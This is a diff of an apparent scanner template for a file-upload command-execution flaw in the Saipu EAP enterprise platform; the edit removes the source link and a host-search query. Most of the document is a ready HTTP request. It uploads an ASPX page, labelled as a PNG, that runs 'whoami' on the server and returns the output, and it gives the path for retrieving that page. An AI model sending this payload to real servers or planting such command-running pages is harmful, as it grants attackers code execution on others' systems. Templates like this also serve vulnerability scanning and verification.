@@ -3,15 +3,11 @@ info:
   name: 赛普EAP企业适配管理平台Handler Upload.aspx文件上传导致命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mnpzwgv8ai2qag4b'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mnpzwgv8ai2qag4b
-    fofa: body="IDWebSoft/"
 http:
 - raw:
-  - "POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1\nHost: {{Hostname}}\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data; boundary=---------------------------900016908377990696644465908391\nContent-Length: 671\n\n-----------------------------900016908377990696644465908391\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.aspx\"\nContent-Type: image/png\n\n<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<%\n    Process process = new Process();\n    process.StartInfo.FileName = \"whoami\";\n    process.StartInfo.RedirectStandardOutput = true;\n    process.StartInfo.UseShellExecute = false;\n    process.StartInfo.CreateNoWindow = true;\n    process.Start();\n\n    string output = process.StandardOutput.ReadToEnd();\n    process.WaitForExit();\n\n    Response.Write(output);\n%>\n-----------------------------900016908377990696644465908391--\n\n\n**上传定位：GET /IDWebSoft/Accessary/2024/11/364b734c-1e78-4ca9-9236-894494464739.aspx HTTP/1.1**"
+  - "POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1\nHost: {{Hostname}}\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: multipart/form-data; boundary=---------------------------900016908377990696644465908391\nContent-Length: 671\n\n-----------------------------900016908377990696644465908391\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.aspx\"\nContent-Type: image/png\n\n<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<%\n    Process process = new Process();\n    process.StartInfo.FileName = \"whoami\";\n    process.StartInfo.RedirectStandardOutput = true;\n    process.StartInfo.UseShellExecute = false;\n    process.StartInfo.CreateNoWindow = true;\n    process.Start();\n\n    string output = process.StandardOutput.ReadToEnd();\n    process.WaitForExit();\n\n    Response.Write(output);\n%>\n-----------------------------900016908377990696644465908391--\n\n**上传定位：GET /IDWebSoft/Accessary/2024/11/364b734c-1e78-4ca9-9236-894494464739.aspx HTTP/1.1**"
   redirects: false
   matchers:
   - status:
